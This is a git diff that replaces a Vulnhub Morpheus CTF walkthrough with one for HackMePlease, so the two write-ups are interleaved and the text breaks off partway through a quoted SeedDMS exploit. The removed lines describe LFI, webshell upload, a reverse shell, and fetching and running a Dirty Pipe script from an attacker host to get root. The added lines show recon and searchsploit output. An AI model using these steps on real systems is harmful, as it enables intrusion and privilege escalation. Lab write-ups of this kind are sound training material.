@@ -1,26 +1,25 @@
-# Vulnhub Matrix-breakout-2-Morpheus
+# Vulnhub HackMePlease
 
 
-Vulnhub Training Walkthrough -- Matrix-breakout-2-Morpheus
+Vulnhub Training Walkthrough -- HackMePlease
 
 <!--more-->
 
 ## Knowledge
 
-- LFI -- Local File Include
-- LinPEAS -- 
-- Dirty-Pipe CVE-2022-0847
-- php://filter
+- js information
+- conf file search
+- mysql search
 
 ## 1. Environment Setup
 
-Download the [OVA file](https://download.vulnhub.com/matrix-breakout/matrix-breakout-2-morpheus.ova), import into VMware and just run.
+Download the target [rar file](https://download.vulnhub.com/hackmeplease/Hack_Me_Please.rar), unrar and import into VMware.
 
 ## 2. Reconnaisence
 
 ### 1. IP Address
 
-arp-scan scanner:
+arp-scan get ip address:
 
 ```shell
 ┌──(v4ler1an㉿kali)-[~]
@@ -32,347 +31,220 @@ WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
 172.16.86.2	00:50:56:fd:f8:ec	(Unknown)
-172.16.86.153	00:0c:29:f6:3b:cd	(Unknown)
-172.16.86.254	00:50:56:ed:8a:52	(Unknown)
+172.16.86.150	00:0c:29:5c:d6:04	(Unknown)
+172.16.86.254	00:50:56:f7:44:1e	(Unknown)
 
-4 packets received by filter, 0 packets dropped by kernel
-Ending arp-scan 1.10.0: 256 hosts scanned in 2.250 seconds (113.78 hosts/sec). 4 responded
+8 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.232 seconds (114.70 hosts/sec). 4 responded
 ```
-
-Target IP is 172.16.86.152.
 
 ### 2. Port Info
 
-Scan the port and service:
+nmap get port and service information:
 
 ```shell
 ┌──(v4ler1an㉿kali)-[~]
-└─$ nmap -T4 -p- -sC -sV -sT -A -Pn 172.16.86.153
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-14 21:14 EST
-Nmap scan report for 172.16.86.153
-Host is up (0.00033s latency).
+└─$ nmap -p- -sV -sC  172.16.86.150 --open
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 22:11 EST
+
+
+┌──(v4ler1an㉿kali)-[~]
+└─$ nmap -T4 -p- -sV -sC  172.16.86.150 --open
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 22:11 EST
+Nmap scan report for 172.16.86.150
+Host is up (0.0011s latency).
 Not shown: 65532 closed tcp ports (conn-refused)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
-| ssh-hostkey:
-|_  256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)
-80/tcp open  http    Apache httpd 2.4.51 ((Debian))
-|_http-server-header: Apache/2.4.51 (Debian)
-|_http-title: Morpheus:1
-81/tcp open  http    nginx 1.18.0
-|_http-server-header: nginx/1.18.0
-| http-auth:
-| HTTP/1.1 401 Unauthorized\x0D
-|_  Basic realm=Meeting Place
-|_http-title: 401 Authorization Required
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Welcome to the land of pwnland
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+3306/tcp  open  mysql   MySQL 8.0.25-0ubuntu0.20.04.1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate
+| Not valid before: 2021-07-03T00:33:15
+|_Not valid after:  2031-07-01T00:33:15
+| mysql-info:
+|   Protocol: 10
+|   Version: 8.0.25-0ubuntu0.20.04.1
+|   Thread ID: 44
+|   Capabilities flags: 65535
+|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, LongColumnFlag, InteractiveClient, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolNew, FoundRows, LongPassword, IgnoreSigpipes, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: GoAEc\x05_7@yr\x0C:usjD6d+
+|_  Auth Plugin Name: caching_sha2_password
+33060/tcp open  mysqlx?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
+|     Invalid message"
+|     HY000
+|   LDAPBindReq:
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns:
+|     Invalid message-frame."
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.94SVN%I=7%D=11/13%Time=6552E561%P=x86_64-pc-linux-gnu
+SF:%r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\
+SF:x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HT
+SF:TPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0
+SF:\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNS
+SF:VersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestT
+SF:CP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\
+SF:x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a
+SF:\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
+SF:\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCo
+SF:okie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x
+SF:0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messa
+SF:ge\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgN
+SF:eg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\
+SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x0
+SF:5HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStr
+SF:ing,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0
+SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
+SF:e\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\
+SF:x01\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x
+SF:20message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
+SF:(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\
+SF:0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Not
+SF:esRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x
+SF:1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x
+SF:05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,
+SF:32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inv
+SF:alid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x
+SF:05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
+SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds
+Nmap done: 1 IP address (1 host up) scanned in 19.48 seconds
 ```
 
-Port and service:
+Port and service info:
 
-| port | service             |
-| ---- | ------------------- |
-| 22   | ssh                 |
-| 80   | Apache httpd 2.4.51 |
-| 81   | nginx 1.18.0        |
+| port  | service             |
+| ----- | ------------------- |
+| 80    | Apache httpd 2.4.41 |
+| 3306  | MySQL 8.0.25        |
+| 33060 | mysqlx              |
 
-Access the 80 webpage:
+Access the web page:
 
-![image-20231115102052270](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151020427.png)
+![image-20231114114339908](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141143149.png)
 
-The source of page is:
-
-```shell
-<html>
-	<head><title>Morpheus:1</title></head>
-	<body>
-		Welcome to the Boot2Root CTF, Morpheus:1.
-		<p>
-		You play Trinity, trying to investigate a computer on the 
-		Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.
-		<p>
-		Good luck!
-
-		- @jaybeale from @inguardians
-		<p>
-		<img src="trinity.jpeg">
-	</body>
-</html>
-
-```
-
-The picture is normal.
-
-Access the 81 port:
-
-![image-20231115102156307](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151021400.png)
-
-Has a login page, but we have no name and password. The username maybe is `Trinity` or `Cypher`.
+It's a common web page, and find nothing.
 
 ### 3. Web Directory
 
-Scan the web directory:
+Well, just scan the web directory:
 
 ```shell
 ┌──(v4ler1an㉿kali)-[~]
-└─$ gobuster dir -u http://172.16.86.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,bak,txt,html -t 60
+└─$ gobuster dir -u http://172.16.86.150:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://172.16.86.153
+[+] Url:                     http://172.16.86.150:80/
 [+] Method:                  GET
-[+] Threads:                 60
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 [+] Negative Status codes:   404
 [+] User Agent:              gobuster/3.6
-[+] Extensions:              php,bak,txt,html
 [+] Timeout:                 10s
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/.php                 (Status: 403) [Size: 278]
-/index.html           (Status: 200) [Size: 348]
-/.html                (Status: 403) [Size: 278]
-/javascript           (Status: 301) [Size: 319] [--> http://172.16.86.153/javascript/]
-/robots.txt           (Status: 200) [Size: 47]
-/graffiti.txt         (Status: 200) [Size: 139]
-/graffiti.php         (Status: 200) [Size: 451]
-/.html                (Status: 403) [Size: 278]
-/.php                 (Status: 403) [Size: 278]
+/img                  (Status: 301) [Size: 312] [--> http://172.16.86.150/img/]
+/css                  (Status: 301) [Size: 312] [--> http://172.16.86.150/css/]
+/js                   (Status: 301) [Size: 311] [--> http://172.16.86.150/js/]
+/fonts                (Status: 301) [Size: 314] [--> http://172.16.86.150/fonts/]
 /server-status        (Status: 403) [Size: 278]
-Progress: 1102800 / 1102805 (100.00%)
+Progress: 220560 / 220561 (100.00%)
 ===============================================================
 Finished
 ===============================================================
 ```
 
-We can find `robots.txt`, `graffiti.txt` and `graffiti.php` file, just look at it.
+Just find some common directory.
+
+Look into `js` directory, maybe we can find some userful js file:
 
 ```shell
-┌──(v4ler1an㉿kali)-[~/Documents/tmp]
-└─$ curl http://172.16.86.153/robots.txt
-There's no white rabbit here.  Keep searching!
-                                                                              
-┌──(v4ler1an㉿kali)-[~/Documents/tmp]
-└─$ curl http://172.16.86.153/graffiti.txt
-Mouse here - welcome to the Nebby!
-
-Make sure not to tell Morpheus about this graffiti wall.
-It's just here to let us blow off some steam.
-
+┌──(v4ler1an㉿kali)-[~]
+└─$ gobuster dir -u http://172.16.86.150:80/js/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .js,.txt -t 60
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.16.86.150:80/js/
+[+] Method:                  GET
+[+] Threads:                 60
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              js,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/main.js              (Status: 200) [Size: 2997]
+/plugins.js           (Status: 200) [Size: 126889]
+/vendor               (Status: 301) [Size: 318] [--> http://172.16.86.150/js/vendor/]
+Progress: 661680 / 661683 (100.00%)
+===============================================================
+Finished
+===============================================================
 ```
 
-![image-20231115142554473](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151425610.png)
+We can see a `vendor` directory and `main.js` and `plugins.js`. Access them, and can find something useful in `main.js`:
 
-We found a message input box.
+![image-20231114114838434](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141148581.png)
+
+We got a path named `/seeddms51x/seeddms-5.1.22/`, access it:
+
+![image-20231114114923877](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141149029.png)
+
+Well, it looks like a CMS named  `SeedDMS` 's login page. 
 
 ## 3. Exploit
 
-Now, let's test `graffiti.php` with burp:
-
-![image-20231115142725188](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151427316.png)
-
-As we can see, when we text in message box, the server will return the `graffiti.txt` file, and what we input in message box will be accour here. So, here has a LFI vulnerability.
-
-### 1. LFI
-
-We can check out the `graffiti.php ` source code with php:filter through the LFI:
-
-![image-20231115143317154](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151433288.png)
-
-Decode with base64 and then got the source code:
+Search exploit about SeedDMS:
 
 ```shell
-<?php
+┌──(v4ler1an㉿kali)-[~/Documents/tmp]
+└─$ sudosearchsploit -t seeddms
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                                              |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)                                                                                                                                                             | php/webapps/50062.py
+SeedDMS 5.1.18 - Persistent Cross-Site Scripting                                                                                                                                                                            | php/webapps/48324.txt
+SeedDMS < 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting                                                                                                                                                                  | php/webapps/47024.txt
+SeedDMS < 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting                                                                                                                                                                    | php/webapps/47023.txt
+SeedDMS versions < 5.1.11 - Remote Command Execution                                                                                                                                                                        | php/webapps/47022.txt
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
 
-$file="graffiti.txt";
-if($_SERVER['REQUEST_METHOD'] == 'POST') {
-    if (isset($_POST['file'])) {
-       $file=$_POST['file'];
-    }
-    if (isset($_POST['message'])) {
-        $handle = fopen($file, 'a+') or die('Cannot open file: ' . $file);
-        fwrite($handle, $_POST['message']);
-	fwrite($handle, "\n");
-        fclose($file); 
-    }
-}
+┌──(v4ler1an㉿kali)-[~/Documents/tmp]
+└─$ searchsploit -x php/webapps/47022.txt
+  Exploit: SeedDMS versions < 5.1.11 - Remote Command Execution
+      URL: https://www.exploit-db.com/exploits/47022
+     Path: /usr/share/exploitdb/exploits/php/webapps/47022.txt
+    Codes: CVE-2019-12744
+ Verified: False
+File Type: ASCII text
 
-// Display file
-$handle = fopen($file,"r");
-while (!feof($handle)) {
-  echo fgets($handle);
-  echo "<br>\n";
-}
-fclose($handle);
-?>
-```
 
-We fill the `file` parameter with `php://filter/read=convert.base64-encode/resource=graffiti.php`, and we got the source code of `graffiti.php`.
 
-### 2. Upload the webshell
-
-In the source code of `graffiti.php`, we can find that the `$file` variable with replaced with the POST's parameter `file`, and then write the `message` we inputed into the `file`. So, we can use it write a webshell here:
-
-![image-20231115144010659](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151440825.png)
-
-And then connect it with AntSword:
-
-![image-20231115144659387](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151446555.png)
-
-### 3. Get the reverse shell
-
-And then we user a php reverse shell to get shell:
-
-![image-20231115150726321](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151507489.png)
-
-And then switch the shell by python:
-
-```shell
-$ python3 -c 'import pty;pty.spawn("/bin/bash")';
-www-data@morpheus:/$ id
-id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-www-data@morpheus:/$ ls
-ls
-FLAG.txt  boot	dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
-bin	  crew	etc  lib   lib64  lost+found  mnt    proc  run	 srv   tmp  var
-www-data@morpheus:/$ cat FLAG.txt
-cat FLAG.txt
-Flag 1!
-
-You've gotten onto the system.  Now why has Cypher locked everyone out of it?
-
-Can you find a way to get Cypher's password? It seems like he gave it to
-Agent Smith, so Smith could figure out where to meet him.
-
-Also, pull this image from the webserver on port 80 to get a flag.
-
-/.cypher-neo.png
-```
-
-## 4. Privilege Escalation
-
-Now, we need to get root. We can find two user in home:
-
-```shell
-www-data@morpheus:/$ ls /home
-ls /home
-cypher	trinity
-www-data@morpheus:/$ find / -user cypher -type f 2>/dev/null
-find / -user cypher -type f 2>/dev/null
-/FLAG.txt
-www-data@morpheus:/$ find / -user trinity -type f 2>/dev/null
-find / -user trinity -type f 2>/dev/null
-/home/trinity/.bash_logout
-/home/trinity/.bashrc
-/home/trinity/.profile
-```
-
-Nothing useful. Let's use LinPEAS:
-
-```shell
-www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/LinPEAS.sh
-wget http://172.16.86.138:8080/LinPEAS.sh
---2023-11-15 06:35:55--  http://172.16.86.138:8080/LinPEAS.sh
-Connecting to 172.16.86.138:8080... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 847815 (828K) [text/x-sh]
-Saving to: ‘LinPEAS.sh’
-
-LinPEAS.sh          100%[===================>] 827.94K  --.-KB/s    in 0.04s
-
-2023-11-15 06:35:55 (22.5 MB/s) - ‘LinPEAS.sh’ saved [847815/847815]
-
-www-data@morpheus:/var/www/html$ ls
-ls
-LinPEAS.sh    graffiti.txt  php_reverse_shell.php  shell.php
-graffiti.php  index.html    robots.txt		   trinity.jpeg
-www-data@morpheus:/var/www/html$ ls -la
-ls -la
-total 1284
-drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:35 .
-drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
--rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
--rw-rw-rw- 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
--rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
--rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
--rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
--rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
--rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
--rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
--rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
-www-data@morpheus:/var/www/html$ chmod +x LinPEAS.sh
-chmod +x LinPEAS.sh
-
-```
-
-We can find something useful:
-
-![image-20231115155130030](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151551250.png)
-
-We can use Dirty-Pipe to get root. The [exploit](https://github.com/imfiver/CVE-2022-0847). Download it and then execute:
-
-```shell
-www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/dirty_pipe.sh
-wget http://172.16.86.138:8080/dirty_pipe.sh
---2023-11-15 06:47:08--  http://172.16.86.138:8080/dirty_pipe.sh
-Connecting to 172.16.86.138:8080... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 4855 (4.7K) [text/x-sh]
-Saving to: ‘dirty_pipe.sh’
-
-dirty_pipe.sh       100%[===================>]   4.74K  --.-KB/s    in 0s
-
-2023-11-15 06:47:08 (489 MB/s) - ‘dirty_pipe.sh’ saved [4855/4855]
-
-www-data@morpheus:/var/www/html$ ls -la
-ls -la
-total 1292
-drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:47 .
-drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
--rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
--rwxrwxrwx 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
--rw-rw-rw- 1 www-data www-data   4855 Nov 15 03:32 dirty_pipe.sh
--rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
--rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
--rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
--rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
--rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
--rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
--rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
-www-data@morpheus:/var/www/html$ chmod +x dirty_pipe.sh
-chmod +x dirty_pipe.sh
-www-data@morpheus:/var/www/html$ ./dirty_pipe.sh
-./dirty_pipe.sh
-/etc/passwd已备份到/tmp/passwd
-It worked!
-
-# 恢复原来的密码
-rm -rf /etc/passwd
-mv /tmp/passwd /etc/passwd
-root@morpheus:/var/www/html# id
-id
-uid=0(root) gid=0(root) groups=0(root)
-root@morpheus:/var/www/html# ls /root
-ls /root
-FLAG.txt
-root@morpheus:/var/www/html# cat /root/FLAG.txt
-cat /root/FLAG.txt
-You've won!
-
-Let's hope Matrix: Resurrections rocks!
-```
-
-## Attack Path
-
-scann web directory --> analysis php file --> LFI --> upload webshell --> get revers shell --> privilege escalation
-
-s <5.1.11] (REQUIRED)
+┌──(v4ler1an㉿kali)-[~/Documents/tmp]
+└─$ cat /usr/share/exploitdb/exploits/php/webapps/47022.txt
+# Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions <5.1.11]
+# Google Dork: [NA]
+# Date: [20-June-2019]
+# Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
+# Vendor Homepage: [https://www.seeddms.org]
+# Software Link: [https://sourceforge.net/projects/seeddms/files/]
+# Version: [SeedDMS versions <5.1.11] (REQUIRED)
 # Tested on: [NA]
 # CVE : [CVE-2019-12744]
 
